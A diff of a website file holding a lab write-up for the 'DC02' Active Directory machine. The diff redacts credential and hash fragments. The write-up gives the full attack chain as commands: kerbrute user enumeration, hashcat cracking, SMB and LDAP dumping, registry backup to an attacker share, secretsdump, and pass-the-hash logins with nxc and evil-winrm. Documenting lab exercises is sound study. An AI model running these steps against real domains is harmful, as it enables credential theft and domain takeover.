@@ -78,17 +78,16 @@ Host script results:
 |_clock-skew: 3h59m56s
 \`\`\`
 
+### Service Enumeration
 Adding the domains into \`hosts\` file.
 \`\`\`bash
 echo "192.168.0.18 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL" | sudo tee -a /etc/hosts
 \`\`\`
 
-### Service Enumeration
 Running kerbrute to enumerate users.
 \`\`\`bash
 ./kerbrute_linux_amd64 userenum --dc 192.168.0.18 -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 \`\`\`
-
 ![Kerbrute User Enumeration](/images/writeups/dc02/1.png)
 
 ## Foothold
@@ -126,7 +125,7 @@ hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
 ### User Flag
 The \`zximena448\` user have READ and WRITE permissions on C$ share folder:
 \`\`\`bash
-nxc smb SOUPEDECODE.LOCAL -u zximena448 -p i... --shares
+nxc smb SOUPEDECODE.LOCAL -u zximena448 -p <REDACTED> --shares
 \`\`\`
 ![SYSVOL Domain Listing](/images/writeups/dc02/7.png)
 
@@ -140,7 +139,7 @@ smbclient //192.168.0.18/C$ -U 'zximena448'
 ### Privilege Escalation
 Dumping domain informations with ldapdomaindump.
 \`\`\`bash
-sudo ldapdomaindump -u 'SOUPDECODE.LOCAL\\zximena448' -p 'i...' 192.168.0.18
+sudo ldapdomaindump -u 'SOUPDECODE.LOCAL\\zximena448' -p '<REDACTED>' 192.168.0.18
 \`\`\`
 ![SYSVOL Policy Listing](/images/writeups/dc02/9.png)
 
@@ -158,7 +157,7 @@ impacket-smbserver share /tmp/share -smb2support
 
 - Running the \`impacket-reg\` command to copy the files:
 \`\`\`bash
-impacket-reg SOUPDECODE.LOCAL/zximena448:i...@192.168.0.18 backup -o '\\\\192.168.0.8\\share'
+impacket-reg SOUPDECODE.LOCAL/zximena448:<REDACTED>@192.168.0.18 backup -o '\\\\192.168.0.8\\share'
 \`\`\`
 ![SYSVOL Scripts Listing](/images/writeups/dc02/11.png)
 
@@ -166,7 +165,7 @@ With those files, we can use \`impacket-secretsdump\` to extract the hashes.
 \`\`\`bash
 impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c...:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c<REDACTED>:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 \`\`\`
@@ -174,20 +173,20 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 
 We also can use the \`dc01$\` machine account and make a pass the hash attack to dump all hashes from domain controler.
 \`\`\`bash
-impacket-secretsdump SOUPEDECODE.LOCAL/'dc01$'@192.168.0.18 -hashes :84204...
+impacket-secretsdump SOUPEDECODE.LOCAL/'dc01$'@192.168.0.18 -hashes :84204<REDACTED>
 \`\`\`
 ![Backup Script Content](/images/writeups/dc02/13.png)
 
 ### Root Flag
 We can authenticate as the Administrator making a pass the hash attack:
 \`\`\`bash
-nxc winrm 192.168.0.18 -u Administrator -H 8982...
+nxc winrm 192.168.0.18 -u Administrator -H 8982<REDACTED>
 \`\`\`
 ![Administrator Authentication](/images/writeups/dc02/14.png)
 
 Authenticating as Administrator and retrieving the root flag.
 \`\`\`bash
-evil-winrm -i 192.168.0.18 -u Administrator -H 8982...
+evil-winrm -i 192.168.0.18 -u Administrator -H 8982<REDACTED>
 \`\`\`
 ![Root Flag Retrieval](/images/writeups/dc02/17.png)
     `
@@ -263,7 +262,7 @@ evil-winrm -i 192.168.0.18 -u Administrator -H 8982...
                 </div>
               </div>
               <div className="machine-info-right">
-                <img src="/images/writeups/dc02-machine.png" alt="DC02 Machine" className="machine-image" />
+                <img src="/images/writeups/dc02/machine.png" alt="DC02 Machine" className="machine-image" />
               </div>
             </div>
           </div>
